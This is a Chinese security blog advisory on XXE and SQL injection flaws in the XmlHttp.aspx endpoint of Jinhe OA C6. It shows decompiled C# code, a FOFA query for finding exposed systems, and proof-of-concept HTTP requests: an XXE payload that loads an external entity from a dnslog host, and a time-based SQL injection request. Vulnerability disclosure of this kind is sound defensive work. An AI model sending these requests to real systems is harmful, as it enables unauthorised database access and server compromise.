---
title: "金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html
asset_dir: assets/金和oa-jhsoft.web.acceptxmlhttp.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/11 08:15
- 628浏览
- [0评论](#comment)
- 57分钟阅读

深入探索

安全工具开发

漏洞扫描服务

代码安全审计

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.Accept/XmlHttp.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

脚本语言

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"
>
> 漏洞修复方案

# 漏洞分析

深入探索

漏洞预警服务

技术文章订阅

JSON处理工具

在 `bin` 目录下查找 `JHSoft.Web.Accept.dll` 将其进行反编译后找到 `XmlHttp` 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
  switch (xmlDocument.SelectSingleNode("//root//Flag").InnerText)
  {
    case "savesendperson":
      string innerText1 = xmlDocument.SelectSingleNode("//root//hid1").InnerText;
      string innerText2 = xmlDocument.SelectSingleNode("//root//hid2").InnerText;
      List<string> stringList = new List<string>();
      if (string.op_Inequality(innerText1, ""))
      {
        foreach (DataRow row in (InternalDataCollectionBase) dbOperator.ExecSQLReDataTable($"select userid from dbo.vw_Users where DeptID in ({innerText1}) and DeleteFlag = 0 and SysFlag = 0 and UserType<> 2").Rows)
        {
          if (!stringList.Contains(row["userid"].ToString()))
            stringList.Add(row["userid"].ToString());
        }
      }
      if (string.op_Inequality(innerText2, ""))
      {
        foreach (DataRow row in (InternalDataCollectionBase) dbOperator.ExecSQLReDataTable($"select userid from dbo.vw_Users where DeptID in ({innerText2}) and DeleteFlag = 0 and SysFlag = 0 and UserType<> 2").Rows)
        {
          if (!stringList.Contains(row["userid"].ToString()))
            stringList.Add(row["userid"].ToString());
        }
      }
      string str1 = "";
      foreach (string str2 in stringList)
        str1 = $"{str1}{str2},";
      string str3 = str1.TrimEnd(new char[1]{ ',' });
      string QueryString4 = $"delete from tb_hyz_ioasendPerson where datediff(day,getdate(),send_time)<>0 ; insert into tb_hyz_ioasendPerson values('{this.Session["usercode"].ToString()}','{str3}',getdate())";
      dbOperator.ExecSQLReInt(QueryString4);
      break;
    case "checkAnJuan":
      string innerText3 = xmlDocument.SelectSingleNode("//root//ajname").InnerText;
      string QueryString5 = $"select * from vw_ArchivesDossierSearch where dossyear = '{xmlDocument.SelectSingleNode("//root//nd").InnerText}' and dosstitle = '{innerText3}'";
      DataTable dataTable2 = dbOperator.ExecSQLReDataTable(QueryString5);
      if (dataTable2 != null && ((InternalDataCollectionBase) dataTable2.Rows).Count > 0)
        this.Response.Write("该年度案卷名称已存在！");
      else
        this.Response.Write("");
      this.Response.End();
      break;
    case "checkJGWT":
      string innerText4 = xmlDocument.SelectSingleNode("//root//jgwtname").InnerText;
      string QueryString6 = $"select * from ArchivesDossierType where delflag = 0 and DossTName = '{innerText4}'";
      string empty = string.Empty;
      try
      {
        string innerText5 = xmlDocument.SelectSingleNode("//root//id").InnerText;
        if (!string.IsNullOrEmpty(innerText5))
          QueryString6 = $"select * from ArchivesDossierType where delflag = 0 and DossTName = '{innerText4}' and DossTID<>'{innerText5}'";
      }
      catch
      {
      }
      DataTable dataTable3 = dbOperator.ExecSQLReDataTable(QueryString6);
      if (dataTable3 != null && ((InternalDataCollectionBase) dataTable3.Rows).Count > 0)
        this.Response.Write("该机构问题名称已存在！");
      else
        this.Response.Write("");
      this.Response.End();
      break;
    case "plan_time":
      string innerText6 = xmlDocument.SelectSingleNode("//root//userid").InnerText;
      string QueryString7 = $"select CalendarBeginTime from dbo.CalendarMain where CalendarTitle ='明日提示' and CalendarContent = '{xmlDocument.SelectSingleNode("//root//content").InnerText}' and CalendarUser='{innerText6}' and delFlag=0";
      DataTable dataTable4 = dbOperator.ExecSQLReDataTable(QueryString7);
      if (dataTable4 != null && ((InternalDataCollectionBase) dataTable4.Rows).Count > 0)
      {
        string str4 = $"{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[1].Split(new char[1]{ ':' })[0]}:{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[1].Split(new char[1]{ ':' })[1]}";
        this.Response.Write($"{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[0]}|{str4}|yes");
      }
      else
      {
        HttpResponse response = this.Response;
        DateTime dateTime = DateTime.Now;
        dateTime = dateTime.AddDays(1.0);
        string str5 = dateTime.ToString("yyyy-MM-dd") + "|09:00|no";
        response.Write(str5);
      }
      this.Response.End();
      break;
  }
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE](https://mrxn.net/tag/XXE)漏洞，同时根据 `Flag` 的值不同做不同的处理,当 `Flag` 的值为 `savesendperson` 时，`hid1`、`hid2` 的值就被直接拼接进SQL语句中执行，无任何过滤和校验，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，其他如 `checkJGWT`、`plan_time` 也是存在同样的[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

[![金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-001-8838208339ba.webp)](https://image.mrxn.net/6eec0ee38b864249bea069fc9eace4e2.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
  <hid1>1)SQLI_POC </hid1>
  <hid2>1)SQLI_POC </hid2>
  <ajname></ajname>
  <jgwtname></jgwtname>
  <id></id>
  <userid></userid>
  <Flag>savesendperson</Flag>
  <fieldcode></fieldcode>
</root>
```

[![金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-002-64eaf8061428.webp)](https://image.mrxn.net/064ac222bb3a42288edd9efc88b7d205.webp)

成功延时 6 秒钟

SQL注入检测工具

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL注入](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
